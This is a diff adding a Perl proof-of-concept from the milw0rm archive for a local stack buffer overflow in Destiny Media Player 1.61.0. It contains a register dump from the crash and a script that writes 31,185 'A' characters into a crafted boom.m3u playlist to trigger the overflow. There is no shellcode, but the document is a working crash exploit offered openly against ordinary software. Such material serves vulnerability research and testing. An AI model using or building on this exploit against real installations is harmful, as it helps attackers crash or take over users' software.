@@ -1,0 +1,50 @@
+#!/usr/bin/perl -w
+
+########################################################################
+#Program  : Destiny Media Player                                      
+#Version  : 1.61.0                              
+#website  : http://www.pirateradio.com/downloads/                  
+#Download : http://www.pirateradio.com/downloads/destinymp3.exe
+#Type     : (.m3u File) local Stack Overflow PoC                    
+########################################################################
+
+#EAX 61616161
+#ECX 00000001
+#EDX 014377A0
+#EBX 0000000B
+#ESP 0030FFEC
+#EBP 00312C04 ASCII "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+#ESI 00000000
+#EDI 00312C44 ASCII "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+#EIP 004266D7 Destiny.004266D7
+#C 0  ES 0023 32bit 0(FFFFFFFF)
+#P 1  CS 001B 32bit 0(FFFFFFFF)
+#A 0  SS 0023 32bit 0(FFFFFFFF)
+#Z 1  DS 0023 32bit 0(FFFFFFFF)
+#S 0  FS 003B 32bit 7FFDE000(FFF)
+#T 0  GS 0000 NULL
+#D 0
+#O 0  LastErr ERROR_SUCCESS (00000000)
+#EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+#ST0 empty -??? FFFF 00000000 00000000
+#ST1 empty 0.0
+#ST2 empty 1.0000000000000000000
+#ST3 empty 0.0
+#ST4 empty 0.0
+#ST5 empty 1.0000000000000000000
+#ST6 empty 3672.0000000000000000
+#ST7 empty 0.5000000000000000000
+#               3 2 1 0      E S P U O Z D I
+#FST 0020  Cond 0 0 0 0  Err 0 0 1 0 0 0 0 0  (GT)
+#FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+my $file="boom.m3u";
+
+
+open(my $FILE, ">>$file") or die "Cannot open $file: $!";
+print $FILE "A" x 31185;
+close($FILE);
+print "$file has been created \n";
+
+# milw0rm.com [2009-01-02]
